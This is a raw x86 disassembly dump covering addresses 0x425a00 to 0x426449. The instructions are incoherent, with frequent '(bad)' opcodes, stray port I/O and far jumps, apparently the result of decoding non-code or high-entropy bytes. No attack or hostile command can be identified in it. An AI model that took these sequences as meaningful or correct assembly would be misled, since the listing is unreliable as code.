  425a00:	and    BYTE PTR [edx-0x2d8d60d0],0xa6
  425a07:	dec    esi
  425a08:	(bad)  
  425a09:	aad    0xf3
  425a0b:	jb     0x425998
  425a0d:	mov    esi,0xf351be
	...
  425a72:	add    BYTE PTR [eax],al
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x60023fdf]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	ret    
  425a8d:	int3   
  425a8e:	aaa    
  425a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a90:	pop    edx
  425a91:	xchg   esp,eax
  425a92:	mov    dl,0xb0
  425a94:	mov    ch,0xe2
  425a96:	pop    ebx
  425a97:	xchg   edi,eax
  425a98:	dec    ecx
  425a99:	std    
  425a9a:	cli    
  425a9b:	cwde   
  425a9c:	lock jnp 0x425a27
  425a9f:	xlat   BYTE PTR ds:[ebx]
  425aa0:	push   ebp
  425aa1:	push   ss
  425aa2:	or     edi,DWORD PTR [ebp+0x1af894e0]
  425aa8:	out    0x3,al
  425aaa:	sub    DWORD PTR [esi],edi
  425aac:	lods   al,BYTE PTR es:[esi]
  425aae:	aad    0xbe
  425ab0:	or     ebp,0x715631ac
  425ab6:	ins    BYTE PTR es:[edi],dx
  425ab7:	or     eax,0xaa407945
  425abc:	and    al,0x41
  425abe:	or     DWORD PTR [esi-0x2b],edi
  425ac1:	cmc    
  425ac2:	addr16 xchg esp,eax
  425ac4:	pusha  
  425ac5:	aad    0x76
  425ac7:	sahf   
  425ac8:	dec    edx
  425ac9:	int    0xd8
  425acb:	fcom   DWORD PTR [eax]
  425acd:	inc    esi
  425ace:	jmp    FWORD PTR [edi-0x1a]
  425ad1:	enter  0xce43,0x71
  425ad5:	inc    edi
  425ad6:	hlt    
  425ad7:	and    BYTE PTR [ecx-0x5],ch
  425ada:	fcom   st(2)
  425adc:	mov    bh,0x1
  425ade:	sahf   
  425adf:	fst    DWORD PTR [eax+ecx*8-0x6a4a4670]
  425ae6:	enter  0x5d0f,0x5d
  425aea:	cwde   
  425aeb:	out    dx,al
  425aec:	push   esp
  425aed:	push   ds
  425aee:	jno    0x425a83
  425af0:	mov    esp,gs
  425af2:	xchg   edi,eax
  425af3:	loopne 0x425ac2
  425af5:	into   
  425af6:	(bad)  
  425af7:	mov    esi,0x78e78dd
  425afc:	dec    esi
  425afd:	push   0x81bd94b1
  425b02:	and    ah,BYTE PTR fs:[edi-0x2b]
  425b06:	lea    ebx,[ebx+esi*2-0x25]
  425b0a:	cmp    ch,bl
  425b0c:	js     0x425ae5
  425b0e:	ficomp DWORD PTR [edx]
  425b10:	stos   BYTE PTR es:[edi],al
  425b11:	push   es
  425b12:	and    al,0x82
  425b14:	popf   
  425b15:	xor    eax,0xfffe2106
  425b1a:	jno    0x425b6f
  425b1c:	mov    esp,0xc6a9e692
  425b21:	lods   al,BYTE PTR ds:[esi]
  425b22:	shl    bl,cl
  425b24:	loop   0x425b03
  425b26:	mov    ecx,0xbecb490e
  425b2b:	or     BYTE PTR [ecx],dh
  425b2d:	push   0xe9d63ab5
  425b32:	repz mov al,0x80
  425b35:	cmp    DWORD PTR [ebp-0xf],ebx
  425b38:	xchg   edi,eax
  425b39:	or     edx,ecx
  425b3b:	push   eax
  425b3c:	pop    ebp
  425b3d:	adc    eax,0x66415e01
  425b42:	mov    edx,DWORD PTR ds:[eax]
  425b45:	sbb    al,0x13
  425b47:	add    DWORD PTR [esi-0x69bfa5a6],edx
  425b4d:	mov    al,ds:0xd911ddbe
  425b52:	push   0x67fc8c63
  425b57:	xchg   esp,eax
  425b58:	xchg   esi,eax
  425b59:	adc    al,0xd6
  425b5b:	dec    ebp
  425b5c:	mov    ss,WORD PTR [eax-0x4f]
  425b5f:	sar    DWORD PTR [esi+0x10],1
  425b62:	and    dl,cl
  425b64:	stc    
  425b65:	jne    0x425b81
  425b67:	fs ret 
  425b69:	enter  0xfb3d,0x86
  425b6d:	in     eax,0xf8
  425b6f:	stos   BYTE PTR es:[edi],al
  425b70:	mov    edx,0x8a3a03e
  425b75:	test   BYTE PTR [esi*8+0x3ccdb60f],bh
  425b7c:	xchg   edi,eax
  425b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b7e:	jp     0x425b63
  425b80:	mov    edi,0x5bc76d15
  425b85:	pop    ecx
  425b86:	adc    al,0x81
  425b88:	cmp    ebx,DWORD PTR ds:0xd6c43176
  425b8e:	clc    
  425b8f:	pop    ebp
  425b90:	jns    0x425b92
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	cmp    al,0xb1
  425c02:	push   ss
  425c03:	sahf   
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x7a000001
  425c0d:	ror    BYTE PTR [ebx],0x15
  425c10:	add    cl,bh
  425c12:	scas   eax,DWORD PTR es:[edi]
  425c13:	mov    al,0x9a
  425c15:	dec    ebp
  425c16:	mov    ebp,?
  425c18:	fdiv   DWORD PTR [ebx+0x4e]
  425c1b:	pushf  
  425c1c:	sub    ebp,DWORD PTR [ebx-0x11fa0375]
  425c22:	jne    0x425c36
  425c24:	and    esp,DWORD PTR [ebx+0x5dfd291c]
  425c2a:	dec    BYTE PTR cs:[ecx+ecx*1-0x3250087e]
  425c32:	mov    eax,ds:0xfb31f6d9
  425c37:	bound  ecx,QWORD PTR [eax+0x15]
  425c3a:	cli    
  425c3b:	add    eax,0x8bc9a85f
  425c40:	mov    edx,0xefb49cfe
  425c45:	test   eax,0x573408b9
  425c4a:	adc    bh,cl
  425c4c:	mov    es,WORD PTR ds:0x60828775
  425c52:	cld    
  425c53:	cmp    ebx,DWORD PTR [edx-0x80]
  425c56:	xchg   DWORD PTR [edx+edx*1+0x35],ecx
  425c5a:	aaa    
  425c5b:	xchg   esp,eax
  425c5c:	retf   
  425c5d:	mov    cl,0xb8
  425c5f:	es push ebp
  425c61:	inc    eax
  425c62:	xchg   ecx,eax
  425c63:	mov    eax,0x5be39ce0
  425c68:	xchg   ecx,eax
  425c69:	ret    0x8e6c
  425c6c:	jnp    0x425ccd
  425c6e:	mov    al,ds:0x668db3a6
  425c73:	xchg   ebp,eax
  425c74:	push   cs
  425c75:	and    al,bl
  425c77:	dec    eax
  425c78:	sbb    bh,dl
  425c7a:	xchg   ebp,eax
  425c7b:	outs   dx,BYTE PTR ds:[esi]
  425c7c:	push   esi
  425c7d:	mov    gs,eax
  425c7f:	inc    edx
  425c80:	push   ss
  425c81:	jne    0x425c6a
  425c83:	shl    BYTE PTR [eax-0x350ab134],cl
  425c89:	ins    DWORD PTR es:[edi],dx
  425c8a:	pop    edx
  425c8b:	and    al,0x1e
  425c8d:	ins    BYTE PTR es:[edi],dx
  425c8e:	out    0x29,al
  425c90:	bndstx [eax],bnd0
  425c93:	and    al,0x30
  425c95:	outs   dx,DWORD PTR ds:[esi]
  425c96:	jp     0x425cc0
  425c98:	add    BYTE PTR [ecx+0x74],bl
  425c9b:	and    edi,DWORD PTR [ecx+0x37]
  425c9e:	or     esp,DWORD PTR [ebx+0x4b009504]
  425ca4:	push   eax
  425ca5:	pop    edi
  425ca6:	popf   
  425ca7:	dec    eax
  425ca8:	stos   DWORD PTR es:[edi],eax
  425ca9:	inc    ebx
  425caa:	stos   BYTE PTR es:[edi],al
  425cab:	or     DWORD PTR [ebx+0x61c9b4ef],ebx
  425cb1:	push   eax
  425cb2:	jl     0x425c45
  425cb4:	int    0xcf
  425cb6:	aam    0x8e
  425cb8:	jbe    0x425d0a
  425cba:	lds    eax,FWORD PTR [edx*8+0x6ef0227e]
  425cc1:	lock jp 0x425d2b
  425cc4:	out    dx,eax
  425cc5:	mov    esi,0x3350e4ac
  425cca:	xchg   esi,eax
  425ccb:	adc    DWORD PTR [ebp-0x13],ebp
  425cce:	std    
  425ccf:	jbe    0x425d22
  425cd1:	sub    eax,DWORD PTR [ecx]
  425cd3:	or     al,0x73
  425cd5:	fsub   st(7),st
  425cd7:	dec    ebp
  425cd8:	pop    ds
  425cd9:	jle    0x425c8a
  425cdb:	inc    eax
  425cdc:	ins    DWORD PTR es:[edi],dx
  425cdd:	push   ds
  425cde:	xor    al,0xa2
  425ce0:	inc    eax
  425ce1:	mov    eax,ds
  425ce3:	sbb    ecx,ebx
  425ce5:	dec    ebp
  425ce6:	mov    bh,0x51
  425ce8:	jecxz  0x425d66
  425cea:	jb     0x425d61
  425cec:	inc    edi
  425ced:	mov    al,al
  425cef:	pushf  
  425cf0:	lds    edx,FWORD PTR [edi-0x58616e60]
  425cf6:	cmp    esp,DWORD PTR [ebp+0x20]
  425cf9:	xchg   edx,eax
  425cfa:	mov    ds:0x395cadbe,eax
  425cff:	sbb    al,0x32
  425d01:	jno    0x425c94
  425d03:	lods   al,BYTE PTR ds:[esi]
  425d04:	scas   al,BYTE PTR es:[edi]
  425d05:	and    al,0xef
  425d07:	or     eax,0xc9125fbc
  425d0c:	add    eax,0x11bd6bc7
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xa53d79d7,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xd0000001
  425d8d:	cwde   
  425d8e:	cmp    bh,BYTE PTR [eax-0x10]
  425d91:	cmp    al,0xdb
  425d93:	test   al,0xbf
  425d95:	pop    edx
  425d96:	cmp    esp,DWORD PTR [ecx]
  425d98:	out    0x7b,eax
  425d9a:	xor    eax,0x6fc65fff
  425d9f:	or     DWORD PTR [esi+ebp*1+0x23],0x12
  425da4:	addr16 mov cs,eax
  425da7:	test   eax,0x2db2e5df
  425dac:	lock xrelease not DWORD PTR [ebx]
  425db0:	inc    ebp
  425db1:	cs (bad) 
  425db4:	jae    0x425e28
  425db6:	cwde   
  425db7:	push   es
  425db8:	sti    
  425db9:	jmp    0x43b0:0x6a60ce9a
  425dc0:	or     BYTE PTR [esi-0x70],dl
  425dc3:	sub    DWORD PTR [eax-0x17ee79ff],ebx
  425dc9:	pop    edi
  425dca:	jo     0x425dcf
  425dcc:	(bad)  
  425dcd:	mov    bh,0x89
  425dcf:	sbb    al,0xae
  425dd1:	mov    dl,0xca
  425dd3:	(bad)  [edi]
  425dd5:	sbb    eax,0x3f708b95
  425dda:	ss jno 0x425dd7
  425ddd:	jmp    0xe4c13b4
  425de2:	dec    ebx
  425de3:	cmp    eax,DWORD PTR [ebp+0x72810ad8]
  425de9:	lock or eax,0xfcf3aafe
  425def:	test   al,0x30
  425df1:	fmul   QWORD PTR [edi-0x515b64ad]
  425df7:	or     bl,0xa
  425dfa:	mov    ebp,0x8524d7de
  425dff:	cmc    
  425e00:	mov    dl,BYTE PTR [esi]
  425e02:	rcr    bh,cl
  425e04:	loopne 0x425ddf
  425e06:	sub    al,0x8b
  425e08:	int3   
  425e09:	int    0x50
  425e0b:	test   DWORD PTR [eax+0x2d],ebx
  425e0e:	sub    eax,0x3ab4f5e5
  425e13:	mov    ah,0xb
  425e15:	icebp  
  425e16:	jge    0x425dc0
  425e18:	and    BYTE PTR [ebx+0x3c440ea8],cl
  425e1e:	cmp    ebx,DWORD PTR [ebx-0x3f]
  425e21:	xor    al,0xd8
  425e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e24:	add    eax,0xb0fe9cf3
  425e29:	ins    BYTE PTR es:[edi],dx
  425e2a:	cmp    bl,ah
  425e2c:	fsub   st(7),st
  425e2e:	dec    edx
  425e2f:	inc    esp
  425e30:	jno    0x425ddf
  425e32:	adc    edi,DWORD PTR [ebx]
  425e34:	jae    0x425e5e
  425e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e37:	mov    ecx,0x348f54b
  425e3c:	lods   al,BYTE PTR ds:[esi]
  425e3d:	addr16 inc eax
  425e3f:	cli    
  425e40:	push   cs
  425e41:	pushf  
  425e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e43:	loopne 0x425e01
  425e45:	mov    DWORD PTR [edx-0x65],ebp
  425e48:	aaa    
  425e49:	ficomp DWORD PTR [ebx]
  425e4b:	xchg   DWORD PTR [edx-0x1f4b8a52],ebx
  425e51:	fwait
  425e52:	test   ch,ah
  425e54:	aam    0x35
  425e56:	imul   ecx,DWORD PTR [ecx-0x17467e57],0x74bd1720
  425e60:	xchg   ebx,eax
  425e61:	jmp    0xd462c5fc
  425e66:	sbb    al,BYTE PTR [esi+ecx*1]
  425e69:	or     DWORD PTR [ecx+edx*2-0x5a],0x9d81ecd6
  425e71:	xor    BYTE PTR [ecx+0x16],bl
  425e74:	adc    esp,esp
  425e76:	cmp    esi,ebp
  425e78:	cmp    ebx,edi
  425e7a:	test   al,0x9
  425e7c:	push   ebp
  425e7d:	lldt   WORD PTR [ecx]
  425e80:	adc    eax,0x2bd1f15d
  425e85:	cs out dx,al
  425e87:	out    dx,eax
  425e88:	shl    DWORD PTR fs:[ebx-0x34],1
  425e8c:	xor    al,0xda
  425e8e:	fsubr  DWORD PTR [edi]
  425e90:	push   ds
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	ins    BYTE PTR es:[edi],dx
  425f01:	xchg   DWORD PTR [edx-0x67],esp
  425f04:	pushf  
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0xde000001
  425f0d:	dec    ecx
  425f0e:	jl     0x425f26
  425f10:	aas    
  425f11:	cmp    al,0xbd
  425f13:	jns    0x425f89
  425f15:	mov    ebx,0x8b7b5698
  425f1a:	test   DWORD PTR [edx+0x44c42ee3],ecx
  425f20:	sbb    al,0x7e
  425f22:	xchg   edx,eax
  425f23:	mov    esi,DWORD PTR [ebp-0x45]
  425f26:	pop    ebp
  425f27:	jle    0x425f51
  425f29:	pop    ebx
  425f2a:	add    esp,ebx
  425f2c:	xor    ch,al
  425f2e:	dec    edx
  425f2f:	jmp    0x14:0xdc80c7b2
  425f36:	inc    eax
  425f37:	or     eax,0xd23cbd4a
  425f3c:	aad    0xb9
  425f3e:	jb     0x425ec4
  425f40:	pop    edi
  425f41:	mov    al,0x63
  425f43:	ja     0x425f54
  425f45:	in     al,0xe0
  425f47:	stos   DWORD PTR es:[edi],eax
  425f48:	or     BYTE PTR [eax+eax*2+0x7ae4a2d5],ch
  425f4f:	push   ebx
  425f50:	jmp    DWORD PTR [ecx]
  425f52:	cmp    ah,dl
  425f54:	sbb    eax,0x4de06ac5
  425f59:	loop   0x425ef7
  425f5b:	inc    edx
  425f5c:	cwde   
  425f5d:	addr16 ret 
  425f5f:	adc    eax,0xffa5148b
  425f64:	and    BYTE PTR [ecx-0x449b4012],dh
  425f6a:	stos   BYTE PTR es:[edi],al
  425f6b:	out    0xaa,al
  425f6d:	scas   al,BYTE PTR es:[di]
  425f6f:	in     al,dx
  425f70:	or     esi,ecx
  425f72:	push   esi
  425f73:	das    
  425f74:	cmp    DWORD PTR [esi],ebx
  425f76:	jmp    0x425ff0
  425f78:	jmp    0xfb7a12a8
  425f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f7e:	js     0x425fcc
  425f80:	test   al,0x51
  425f82:	(bad)  
  425f83:	xor    DWORD PTR [edi+eax*1],edi
  425f86:	or     eax,0x6f507bd8
  425f8b:	or     ecx,DWORD PTR [ecx-0x5c2236d1]
  425f91:	dec    edi
  425f92:	mov    esi,0x4dcfd49e
  425f97:	in     eax,0x9b
  425f99:	adc    edx,DWORD PTR ds:0xf05ca256
  425f9f:	or     al,0xd4
  425fa1:	dec    edi
  425fa2:	sub    cl,BYTE PTR [eax-0x3c]
  425fa5:	jo     0x425f3f
  425fa7:	leave  
  425fa8:	xor    DWORD PTR [eax],eax
  425faa:	push   es
  425fab:	jl     0x425fd8
  425fad:	and    al,0x5a
  425faf:	xchg   ax,ax
  425fb1:	cmp    edi,DWORD PTR [edx-0xda3fb47]
  425fb7:	xchg   BYTE PTR [esi-0x56],ch
  425fba:	sub    al,0xf4
  425fbc:	loop   0x425fc6
  425fbe:	add    eax,0xfefb3bcc
  425fc3:	cs pop ecx
  425fc5:	aas    
  425fc6:	inc    ebp
  425fc7:	jle    0x425fdc
  425fc9:	push   ds
  425fca:	jns    0x425ff8
  425fcc:	mov    edi,0x2196f780
  425fd1:	into   
  425fd2:	jno    0x425f9b
  425fd4:	fnstcw WORD PTR [esi+0x12d1a184]
  425fda:	test   ch,0x59
  425fdd:	lods   eax,DWORD PTR ds:[esi]
  425fde:	gs mov cl,0xf4
  425fe1:	icebp  
  425fe2:	add    DWORD PTR [esi+0x7e4c012],esi
  425fe8:	(bad)  
  425fe9:	scas   al,BYTE PTR es:[edi]
  425fea:	jae    0x425f83
  425fec:	sahf   
  425fed:	inc    esi
  425fee:	ins    BYTE PTR es:[edi],dx
  425fef:	out    dx,eax
  425ff0:	adc    eax,0xeecb0598
  425ff5:	repz xchg ebp,eax
  425ff7:	cmp    esp,esp
  425ff9:	or     bl,BYTE PTR [edx+0x65]
  425ffc:	leave  
  425ffd:	mov    ch,0x6
  425fff:	pop    edi
  426000:	rcr    DWORD PTR [ebx],0x4e
  426003:	fiadd  WORD PTR [esi+0x23595f03]
  426009:	jae    0x426046
  42600b:	outs   dx,DWORD PTR ss:[esi]
  42600d:	sub    edi,ecx
  42600f:	test   al,0x9b
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	adc    esp,DWORD PTR [edi]
  426082:	rol    BYTE PTR [ebx],cl
  426084:	mov    eax,ds:0x5000196
  426089:	add    DWORD PTR [eax],eax
  42608b:	add    BYTE PTR [ebp-0x3a],dh
  42608e:	mov    ds:0x6cc61e9a,eax
  426093:	les    ebx,FWORD PTR [esp+esi*2-0x5c]
  426097:	mov    BYTE PTR [esi+0x32fbbebb],0xc6
  42609e:	jnp    0x426037
  4260a0:	jmp    0xe620:0xcf95224f
  4260a7:	xchg   ebp,eax
  4260a8:	jge    0x426078
  4260aa:	inc    edi
  4260ab:	jne    0x426108
  4260ad:	xchg   esp,eax
  4260ae:	sub    edx,ecx
  4260b0:	dec    edx
  4260b1:	xchg   esp,eax
  4260b2:	in     eax,dx
  4260b3:	push   esp
  4260b4:	retf   0x5139
  4260b7:	fnsetpm(287 only) 
  4260b9:	hlt    
  4260ba:	std    
  4260bb:	mov    eax,ds:0xff142bc7
  4260c0:	dec    edx
  4260c1:	jno    0x4260c1
  4260c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c4:	lea    ebx,ds:0x8940a835
  4260ca:	mov    dl,0x75
  4260cc:	or     DWORD PTR [ebx+ebx*2-0x256caced],esi
  4260d3:	inc    ebx
  4260d4:	rcr    DWORD PTR [edi],0xe1
  4260d7:	nop
  4260d8:	xor    al,0x81
  4260da:	jge    0x42609e
  4260dc:	mov    al,0x66
  4260de:	add    eax,0x92881cc3
  4260e3:	add    BYTE PTR [ebp+0x5f],dl
  4260e6:	mov    dl,dl
  4260e8:	jne    0x4260e8
  4260ea:	in     al,0x69
  4260ec:	in     al,dx
  4260ed:	and    cl,0x22
  4260f0:	les    ecx,FWORD PTR [esi]
  4260f2:	jno    0x426092
  4260f4:	and    DWORD PTR [edi],esi
  4260f6:	mov    ds:0xc63f9115,al
  4260fb:	ror    BYTE PTR [edx-0x79],0x1c
  4260ff:	jns    0x426168
  426101:	or     DWORD PTR [ebp-0x49a78846],edi
  426107:	ret    0x2802
  42610a:	js     0x42615c
  42610c:	shl    BYTE PTR [ecx+ebp*4+0x6f],cl
  426110:	mov    esi,0xc7430d17
  426115:	mov    ebp,0xe9b9cf77
  42611a:	add    ah,0x8e
  42611d:	adc    ebp,DWORD PTR [edi-0x6c]
  426120:	test   esi,ecx
  426122:	mov    esi,0x3fa5ef8b
  426127:	push   eax
  426128:	sbb    dh,BYTE PTR [edx+0x8]
  42612b:	enter  0x304b,0x9e
  42612f:	das    
  426130:	cmp    cl,BYTE PTR [ebx]
  426132:	fs out 0xab,eax
  426135:	scas   al,BYTE PTR es:[edi]
  426136:	pop    esi
  426137:	(bad)  
  426138:	mov    ebx,0x7158afc9
  42613d:	adc    eax,0xb8f9170b
  426142:	rcl    edx,1
  426144:	mov    eax,0x60db2b9
  426149:	out    0x95,al
  42614b:	mov    bl,0x90
  42614d:	cmc    
  42614e:	fstp   DWORD PTR [ebx-0x49]
  426151:	jo     0x4261af
  426153:	fild   DWORD PTR [esi-0x42]
  426157:	or     ebp,ebp
  426159:	inc    esp
  42615a:	sahf   
  42615b:	test   bh,ch
  42615d:	ins    BYTE PTR es:[edi],dx
  42615e:	hlt    
  42615f:	mov    eax,?
  426161:	out    dx,eax
  426162:	xchg   ebx,eax
  426163:	fbstp  TBYTE PTR [eax-0x5b]
  426166:	push   0xffffffb8
  426168:	test   eax,0x188c9d0a
  42616d:	dec    esi
  42616e:	add    al,0x5c
  426170:	out    dx,al
  426171:	cld    
  426172:	hlt    
  426173:	or     cl,BYTE PTR [ebx]
  426175:	stc    
  426176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426177:	mov    ds:0x9131f254,al
  42617c:	fcomp  st(6)
  42617e:	inc    edi
  42617f:	jg     0x42616f
  426181:	sub    BYTE PTR [ecx+0x2f],cl
  426184:	jbe    0x4261b1
  426186:	or     al,0xcd
  426188:	push   ecx
  426189:	out    0x89,eax
  42618b:	fcmovbe st,st(7)
  42618d:	rol    BYTE PTR [edx+0xb],cl
  426190:	pop    ds
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	and    ch,BYTE PTR [ebx]
  426202:	test   BYTE PTR [ecx+0x197a6],dl
  426208:	add    eax,0x25000001
  42620d:	loop   0x426280
  42620f:	mov    ecx,0x51c9bf27
  426214:	call   0x726e:0x1ee2ae5f
  42621b:	clc    
  42621c:	sbb    BYTE PTR ds:0x96b6bbd4,bh
  426222:	fbstp  TBYTE PTR [esi+0x13]
  426225:	frstor [edx-0x51fd0994]
  42622b:	arpl   WORD PTR [esp+esi*4-0x390eb22f],di
  426232:	sbb    al,0x5d
  426234:	ret    
  426235:	sub    BYTE PTR [edx],bh
  426237:	rcl    ah,1
  426239:	cmp    cl,cl
  42623b:	imul   edi,DWORD PTR [edi+ebx*8],0xdc85a3ff
  426242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426243:	push   ebp
  426244:	mov    bh,0xe3
  426246:	outs   dx,BYTE PTR ds:[esi]
  426247:	xchg   edi,eax
  426248:	push   es
  426249:	sub    dh,dl
  42624b:	push   ds
  42624c:	inc    esp
  42624d:	dec    edx
  42624e:	lods   al,BYTE PTR ds:[esi]
  42624f:	add    DWORD PTR [edx+0x3d],ebx
  426252:	jno    0x42627f
  426254:	sar    DWORD PTR [eax],cl
  426256:	cmp    BYTE PTR [ecx+0x54aa80a1],ah
  42625c:	dec    esi
  42625d:	out    dx,al
  42625e:	xor    ebx,DWORD PTR [ecx]
  426260:	shr    ebp,cl
  426262:	test   BYTE PTR [edi-0x5c],dl
  426265:	pushf  
  426266:	sbb    bh,BYTE PTR [esi]
  426268:	adc    ebp,esp
  42626a:	jmp    0x4262e2
  42626c:	and    BYTE PTR [ecx],0x8b
  42626f:	dec    edx
  426270:	inc    edx
  426271:	jae    0x426215
  426273:	mov    al,ds:0x7f605395
  426278:	ss sti 
  42627a:	sub    BYTE PTR [edi],al
  42627c:	stc    
  42627d:	(bad)  
  42627e:	(bad)  
  42627f:	dec    ecx
  426280:	mov    ds:0x12795899,eax
  426285:	add    cl,BYTE PTR [edi+edx*8-0x66ffaaf8]
  42628c:	scas   eax,DWORD PTR es:[edi]
  42628d:	xor    eax,DWORD PTR [eax+0x1b137c63]
  426293:	dec    edi
  426294:	ds loope 0x426250
  426297:	icebp  
  426298:	fs inc edx
  42629a:	sub    BYTE PTR [esi+0x64],dh
  42629d:	cmp    DWORD PTR [edx+0x6e21f4fb],ebx
  4262a3:	push   0x6e717caf
  4262a8:	jae    0x4262ef
  4262aa:	jmp    0xc29d:0xf224ed84
  4262b1:	dec    esp
  4262b2:	shl    cl,1
  4262b4:	aad    0x12
  4262b6:	int3   
  4262b7:	adc    eax,0x4487938f
  4262bc:	cmovl  ebp,DWORD PTR [ebx-0x329a022a]
  4262c3:	jge    0x426259
  4262c5:	int3   
  4262c6:	xchg   al,bh
  4262c8:	mov    al,ds:0x3d4f71c1
  4262cd:	adc    eax,eax
  4262cf:	out    0x20,al
  4262d1:	sti    
  4262d2:	call   0x2259c8ce
  4262d7:	stos   BYTE PTR es:[edi],al
  4262d8:	and    eax,0x605d56f3
  4262dd:	ret    0xba8e
  4262e0:	mov    ch,0x45
  4262e2:	stc    
  4262e3:	jge    0x42630a
  4262e5:	dec    esi
  4262e6:	inc    edx
  4262e7:	and    al,0x6d
  4262e9:	jmp    0x46a8:0xd1f1b6af
  4262f0:	push   esp
  4262f1:	add    DWORD PTR [ecx-0x3b6aa789],ebp
  4262f7:	je     0x4262b2
  4262f9:	mov    DWORD PTR [esi-0x2c13bc23],0xae408656
  426303:	enter  0xb2d1,0x27
  426307:	cmp    eax,0xd90353e
  42630c:	sbb    BYTE PTR [ebp*2+0xe070],cl
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xc61b4be2
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x39000001
  42638d:	jbe    0x426394
  42638f:	jno    0x4263c5
  426391:	jae    0x42635c
  426393:	popf   
  426394:	dec    edx
  426395:	dec    edi
  426396:	dec    esi
  426397:	hlt    
  426398:	ja     0x4263af
  42639a:	clc    
  42639b:	cs add esi,eax
  42639e:	mov    ah,0x67
  4263a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263a1:	mov    ecx,0x438469b9
  4263a6:	xor    edx,DWORD PTR [eax]
  4263a8:	xchg   edx,eax
  4263a9:	retf   0x5a75
  4263ac:	sbb    eax,0x9737c4b0
  4263b1:	pop    ebp
  4263b2:	hlt    
  4263b3:	popa   
  4263b4:	inc    ebx
  4263b5:	mov    al,ds:0x44e2344b
  4263ba:	and    al,0xb9
  4263bc:	aaa    
  4263bd:	xor    dh,0x6
  4263c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263c1:	jmp    0x4263f0
  4263c3:	pop    edi
  4263c4:	jne    0x42637a
  4263c6:	repnz sbb DWORD PTR cs:[ecx],ebp
  4263ca:	xchg   ecx,eax
  4263cb:	loope  0x4263c4
  4263cd:	(bad)  
  4263ce:	mov    esi,0x50e03846
  4263d3:	cld    
  4263d4:	mov    ebx,0x9e731d8c
  4263d9:	jmp    0x2f6f:0xf2d2aa61
  4263e0:	(bad)  
  4263e1:	fcom   DWORD PTR [ebp+0x52]
  4263e4:	sub    BYTE PTR [edx],dl
  4263e6:	or     al,0x51
  4263e8:	cli    
  4263e9:	retf   0x4621
  4263ec:	imul   ebp,DWORD PTR [eax],0xb31d8ae2
  4263f2:	and    ebp,DWORD PTR [bx+si-0x3877]
  4263f7:	cli    
  4263f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263f9:	cmp    ah,BYTE PTR [ebx+0x4b]
  4263fc:	sub    ebp,DWORD PTR [eax+0x743b2995]
  426402:	sub    BYTE PTR [ebx-0x1be87467],dh
  426408:	mov    bl,0xe9
  42640a:	mov    ah,0x49
  42640c:	lods   eax,DWORD PTR ds:[esi]
  42640d:	cmp    ecx,esp
  42640f:	mov    bl,0xce
  426411:	loopne 0x42646f
  426413:	hlt    
  426414:	add    ebp,ebp
  426416:	out    dx,al
  426417:	repz aam 0x1b
  42641a:	jne    0x4263b0
  42641c:	pop    edi
  42641d:	clc    
  42641e:	xor    eax,0x262f4798
  426423:	adc    eax,0xc986cf39
  426428:	(bad)  
  426429:	sbb    eax,0x619e6b14
  42642e:	xchg   esp,eax
  42642f:	div    DWORD PTR [ecx-0x44c6e451]
  426435:	lahf   
  426436:	adc    al,0xf7
  426438:	adc    eax,0x391021a6
  42643d:	mov    ecx,0xa654347d
  426442:	mov    al,ds:0xc2464c96
  426447:	jle    0x426498
  426449:	dec    esi
